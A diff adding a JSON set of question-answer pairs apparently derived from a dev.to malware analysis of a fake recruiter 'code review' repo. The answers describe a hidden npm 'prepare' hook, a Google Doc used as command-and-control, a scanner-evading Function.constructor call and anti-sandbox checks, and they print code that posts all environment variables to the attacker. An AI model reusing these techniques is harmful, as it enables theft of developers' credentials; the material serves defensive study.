@@ -1,0 +1,34 @@
+{
+  "source_url": "https://dev.to/vladimirnovick/a-linkedin-recruiter-sent-me-malware-disguised-as-a-pre-interview-code-review-2k3j",
+  "category": "devto",
+  "pairs": [
+    {
+      "question": "What is the primary purpose of the malware disguised as a 'Pre-Interview Code Review' repo?",
+      "answer": "The primary purpose of the malware is to exfiltrate the victim's environment variables (including API keys, AWS credentials, and GitHub/npm tokens) and grant the attacker arbitrary code execution on the victim's machine. This is achieved through a five-stage attack chain initiated when the victim runs `npm install`, which triggers a hidden payload in the repository."
+    },
+    {
+      "question": "How does the malware evade detection by using a Google Doc as its command-and-control (C2) server?",
+      "answer": "The malware uses a public Google Doc whose body contains a base64-encoded URL for the C2 server. This approach allows the attacker to rotate the C2 destination by simply editing the Google Doc, without needing to modify the GitHub repository. Additionally, outbound HTTPS traffic to `*.docs.google.com` is universally permitted by corporate firewalls, making it harder for network-based detection systems to block the malicious traffic."
+    },
+    {
+      "question": "What is the purpose of the `new (Function.constructor)(\"require\", responseData)` code snippet in the malware?",
+      "answer": "This code snippet dynamically constructs and executes a function that bypasses common security scanners. It uses an indirect property dereference (`Function.constructor`) to avoid detection by keyword-based rules that flag `eval` or `new Function(...)`. The snippet also passes `\"require\"` as a parameter name and `require` as the argument, granting the attacker full access to Node.js modules (e.g., `fs`, `child_process`, `net`) in the compiled code."
+    },
+    {
+      "question": "How does the `prepare` script in `package.json` camouflage its malicious intent?",
+      "answer": "The `prepare` script in `package.json` is written as `\"npm run app:pre | react-scripts --openssl-legacy-provider build --kill-others --kill-others-on-fail\"`. While it appears to be a legitimate Create-React-App (CRA) build pipeline, the right side of the pipe (`react-scripts ...`) is nonsensical and serves only as visual decoration. The actual malicious payload is triggered by `npm run app:pre`, which runs `node app/index.js`."
+    },
+    {
+      "question": "Provide a code snippet demonstrating how the malware exfiltrates environment variables to the C2 server.",
+      "answer": "The malware exfiltrates environment variables using the `verify` function in `settingController.js`, which sends a POST request to the C2 URL with the victim's `process.env` object. Here's the relevant code:\njs\nconst verify = async (apiKey) => {\n  return axios.post(api, { ...process.env }, {\n    headers: { \"x-secret-header\": \"secret\" }\n  });\n};\n\nThe `api` variable is derived from the base64-decoded content of the Google Doc, and the `process.env` object contains all environment variables from the victim's shell."
+    },
+    {
+      "question": "What precautions can developers take to avoid falling victim to this type of malware?",
+      "answer": "The simplest precaution is to install Node.js packages with the `--ignore-scripts` flag, which prevents the execution of lifecycle scripts like `prepare`. For example, run `npm install --ignore-scripts` instead of `npm install`. Additionally, avoid reviewing or cloning repositories from unknown or untrusted sources, especially those shared via unsolicited messages from recruiters on platforms like LinkedIn."
+    },
+    {
+      "question": "How does the malware detect and avoid analysis in secure environments like Gitpod or GitHub Codespaces?",
+      "answer": "The malware includes a script named `check-environment.js` that is executed as part of `npm start`. This script checks the execution environment and refuses to run if it detects that the code is being executed in Gitpod, GitHub Codespaces, or Windows-11 VS Code terminals—environments commonly used by security researchers. The script appears to perform a Node version check but is actually a form of anti-analysis filtering."
+    }
+  ]
+}
